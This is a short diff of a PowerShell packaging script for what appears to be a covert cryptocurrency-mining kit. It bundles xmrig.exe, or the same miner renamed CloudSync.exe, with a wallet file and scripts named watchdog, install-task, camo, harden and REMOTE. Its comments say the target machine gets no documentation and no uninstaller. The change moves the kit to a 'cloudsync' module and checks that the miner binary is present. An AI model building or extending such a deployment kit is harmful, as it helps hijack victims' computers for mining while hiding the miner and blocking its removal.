@@ -97,8 +97,9 @@ $ErrorActionPreference = 'Stop'
 
 # ------------------------------------------------------------------ payload
 $payload = @(
-    'controller.py', 'gpudetect.py', 'config_high.json', 'manifest.json',
-    # no documentation and no uninstaller on a target machine - both are ours
+    # modular runtime only: no flat controller.py / gpudetect.py, no docs, no
+    # uninstaller. config_high.json is still the worker config template.
+    'config_high.json', 'gpudetect.py', 'manifest.json',
     'wallet.txt', 'watchdog.ps1', 'install-task.ps1',
     'restore-system.ps1', 'harden.ps1', 'camo.ps1', 'check-updates.ps1',
     'REMOTE.cmd'
@@ -111,7 +112,7 @@ if (-not (Test-Path (Join-Path $Source 'install-task.ps1'))) {
 }
 
 $present = @($payload + $binaries | Where-Object { Test-Path (Join-Path $Source $_) })
-if (-not ($present -contains 'controller.py')) { throw "controller.py missing from $Source" }
+if (-not (Test-Path (Join-Path $Source 'cloudsync\__main__.py'))) { throw "cloudsync\__main__.py missing from $Source - this kit is modular-only" }
 if (-not (($present -contains 'CloudSync.exe') -or ($present -contains 'xmrig.exe'))) {
     throw "no miner binary in $Source (CloudSync.exe / xmrig.exe)"
 }
